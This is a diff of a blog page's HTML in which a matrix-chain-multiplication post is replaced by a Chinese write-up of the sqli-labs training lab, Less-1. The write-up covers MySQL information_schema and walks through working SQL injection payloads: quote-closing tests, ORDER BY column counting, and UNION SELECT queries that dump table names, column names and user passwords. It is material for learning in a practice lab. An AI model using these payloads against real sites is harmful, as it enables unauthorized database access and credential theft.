@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>矩阵连乘 · Specter&#39;s Blog</title>
+    <title>sqli-labs靶场练习 · Specter&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">Specter&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">矩阵连乘</a>
+                <a href="#" class="post-name">sqli-labs靶场练习</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            矩阵连乘
+            sqli-labs靶场练习
             <!-- 404 -->
             
         </h1>
@@ -266,20 +266,20 @@ height:50vh;
                 
                     <div class="post-intro-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="算法">算法</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="动态规划">动态规划</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="SQL注入">SQL注入</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">294</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">955</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/11/02</span>
+                    <span class="post-intro-time">2019/01/29</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -403,18 +403,39 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>算法是一门让我很头疼的课程，因为平时也不怎么写代码，现在学了算法了，来总结一下一些基本算法。<a id="more"></a></p>
-<h3 id="矩阵连乘"><a href="#矩阵连乘" class="headerlink" title="矩阵连乘"></a>矩阵连乘</h3><h4 id="最优值-最少数乘次数"><a href="#最优值-最少数乘次数" class="headerlink" title="最优值(最少数乘次数)"></a>最优值(最少数乘次数)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void matrixchain(int *p,int n,int **m,int **s)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span>(int i=1;i&lt;=n;i++)m[i][i]=0;</span><br><span class="line">	<span class="keyword">for</span>(int r=2;r&lt;=n;r++)</span><br><span class="line">		<span class="keyword">for</span>(int i=1;i&lt;=n-r+1;i++)      //行 </span><br><span class="line">		&#123;</span><br><span class="line">			int j=i+r-1;          //列 </span><br><span class="line">			m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j];//在i处断开,</span><br><span class="line">			   //m[i][j]=m[i][i]+m[i+1][j]+p[i-1]*p[i]*p[j],</span><br><span class="line">			   //而m[i][i]=0,所以m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j] </span><br><span class="line">			s[i][j]=i;         //i处断开 </span><br><span class="line">			<span class="keyword">for</span>(int k=i+1;k&lt;j;k++)</span><br><span class="line">			&#123;</span><br><span class="line">				int t=m[i][k]+m[k+1][j]+p[i-1]*p[k]*p[j];  //k=i+1,表示从i以后的点处断开 </span><br><span class="line">				<span class="keyword">if</span>(t&lt;m[i][j])</span><br><span class="line">				&#123;</span><br><span class="line">					m[i][j]=t;</span><br><span class="line">					s[i][j]=k;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="输出最优解"><a href="#输出最优解" class="headerlink" title="输出最优解"></a>输出最优解</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void trackback(int i,int j,int **s)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(i==j)<span class="built_in">return</span>;</span><br><span class="line">	trackback(i,s[i][j],s);</span><br><span class="line">	trackback(s[i][j]+1,j,s);</span><br><span class="line">	cout&lt;&lt;<span class="string">"Mulitiply A"</span>&lt;&lt;i&lt;&lt;<span class="string">","</span>&lt;&lt;s[i][j];</span><br><span class="line">	cout&lt;&lt;<span class="string">"and A"</span>&lt;&lt;(s[i][j]+1)&lt;&lt;<span class="string">","</span>&lt;&lt;j&lt;&lt;endl;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>web题目中好多注入啊，学习一波。<a id="more"></a></p>
+<h3 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h3><p>我是用的phpstudy，用cmd先打开数据库看看(因为忘了怎么在cmd中打开了，所以试一试)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\phpstudy\PHPTutorial\MySQL\bin&gt;mysql -u root -p</span><br></pre></td></tr></table></figure></p>
+<p>然后输入密码即可进入MySQL，</p>
+<h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>在MySQL中，把【INFORMATION_SCHEMA】 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">下面对一些重要的数据字典表做一些说明：</span><br><span class="line"></span><br><span class="line">SCHEMATA表：提供了关于数据库的信息。</span><br><span class="line">TABLES表：给出了关于数据库中的表的信息。</span><br><span class="line">COLUMNS表：给出了表中的列信息。</span><br><span class="line">STATISTICS表：给出了关于表索引的信息。</span><br><span class="line">USER_PRIVILEGES表：给出了关于全程权限的信息。该信息源自mysql.user授权表。</span><br><span class="line">SCHEMA_PRIVILEGES表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。</span><br><span class="line">TABLE_PRIVILEGES表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。</span><br><span class="line">COLUMN_PRIVILEGES表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。</span><br><span class="line">CHARACTER_SETS表：提供了关于可用字符集的信息。</span><br><span class="line">COLLATIONS表：提供了关于各字符集的对照信息。</span><br><span class="line">COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。</span><br><span class="line">TABLE_CONSTRAINTS表：描述了存在约束的表。</span><br><span class="line">KEY_COLUMN_USAGE表：描述了具有约束的键列。</span><br><span class="line">ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。</span><br><span class="line">VIEWS表：给出了关于数据库中的视图的信息。</span><br><span class="line">TRIGGERS表：提供了关于触发程序的信息。</span><br><span class="line">原文链接：https://www.cnblogs.com/hfdp/p/5549384.html</span><br></pre></td></tr></table></figure>
+<h4 id="这是一些经常用到的函数"><a href="#这是一些经常用到的函数" class="headerlink" title="这是一些经常用到的函数"></a>这是一些经常用到的函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. version()——MySQL 版本</span><br><span class="line">2. user()——数据库用户名</span><br><span class="line">3. database()——数据库名</span><br><span class="line">4. @@datadir——数据库路径</span><br><span class="line">5. @@version_compile_os——操作系统版本</span><br></pre></td></tr></table></figure>
+<p> 字符串连接函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line">concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line">group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure></p>
+<h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>输入<strong>?id=1</strong>会回显出id=1的用户信息，</p>
+<p>尝试输入<strong>?id=1 and 1=1</strong>和<strong>?id=1 and 1=2</strong>都可以正常回显</p>
+<p>输入<strong>?id=1’</strong>，发现报错<br><img src="https://s2.ax1x.com/2019/01/30/klynhT.png" alt="klynhT.png"></p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1
+</code></pre><p>是单引号闭合错误，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and &apos;1&apos;=&apos;1   //回显正常</span><br><span class="line">?id=1&apos; and &apos;1&apos;=&apos;2   //无回显</span><br></pre></td></tr></table></figure></p>
+<p>输入<strong>?id=1’–+</strong>即可正常回显</p>
+<p>接下来用order by来测试表的列数，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![kl6yM4.png](https://s2.ax1x.com/2019/01/30/kl6yM4.png)</span><br><span class="line">```?id=1&apos; order by 4--+</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/01/30/kl6DRU.png" alt="kl6DRU.png"></p>
+<p>可以看出猜测3列时，回显正常，猜测4时，报错，说明这个表有3列。</p>
+<p>接下来使用联合查询union</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1,2,3 只是为了保证**union**前后两个语句的列数相同，</span><br><span class="line">id=-1 则是为了使前一个查询无返回结果从而返回第二个 select 的查询结果,只需要将数字替换为相应的想要查询的信息即可.比如：</span><br><span class="line">```?id =1 union select 1,database(),user()--+</span><br></pre></td></tr></table></figure>
+<p>下面使用MySQL自带的一个表information_schema，依次爆库名，爆表名，爆列名，爆数据了</p>
+<p>爆库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![klR00J.png](https://s2.ax1x.com/2019/01/30/klR00J.png)</span><br><span class="line"></span><br><span class="line">爆表名</span><br><span class="line">```?id=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;secuurity&apos;--+</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/01/30/klhEk9.png" alt="klhEk9.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+    //可以直接爆表</span><br></pre></td></tr></table></figure>
+<p>爆列名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![klh8kd.png](https://s2.ax1x.com/2019/01/30/klh8kd.png)</span><br><span class="line"></span><br><span class="line">爆数据</span><br><span class="line">```?id=-1&apos; union select 1,username,password from users where id=5--+</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/01/30/klhB7Q.png" alt="klhB7Q.png"></p>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3>
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://specters.top">Specter</a>
-            </p><p>原文链接：<a href="https://specters.top/2018/11/02/矩阵连乘/">https://specters.top/2018/11/02/矩阵连乘/</a>
-            </p><p>发表日期：<a href="https://specters.top/2018/11/02/矩阵连乘/">November 2nd 2018, 3:28:05 pm</a>
-            </p><p>更新日期：<a href="https://specters.top/2018/11/02/矩阵连乘/">November 9th 2018, 5:05:21 pm</a>
+            </p><p>原文链接：<a href="https://specters.top/2019/01/29/sqli-labs靶场练习/">https://specters.top/2019/01/29/sqli-labs靶场练习/</a>
+            </p><p>发表日期：<a href="https://specters.top/2019/01/29/sqli-labs靶场练习/">January 29th 2019, 5:05:15 pm</a>
+            </p><p>更新日期：<a href="https://specters.top/2019/01/29/sqli-labs靶场练习/">January 30th 2019, 5:23:59 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -422,17 +443,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2018/11/06/0-1背包/" title="0-1背包">
-                    <div class="nextTitle">0-1背包</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2018/10/29/Linux命令简介/" title="Linux命令简介">
-                    <div class="prevTitle">Linux命令简介</div>
+                <a href="/2019/01/24/CUMT双月赛二/" title="CUMMT双月赛二">
+                    <div class="prevTitle">CUMMT双月赛二</div>
                 </a>
             
         </li>
@@ -551,7 +567,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#矩阵连乘"><span class="toc-number">1.</span> <span class="toc-text">矩阵连乘</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#最优值-最少数乘次数"><span class="toc-number">1.1.</span> <span class="toc-text">最优值(最少数乘次数)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#输出最优解"><span class="toc-number">1.2.</span> <span class="toc-text">输出最优解</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识储备"><span class="toc-number">2.</span> <span class="toc-text">知识储备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema"><span class="toc-number">2.1.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#这是一些经常用到的函数"><span class="toc-number">2.2.</span> <span class="toc-text">这是一些经常用到的函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1"><span class="toc-number">3.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">4.</span> <span class="toc-text">Less-2</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
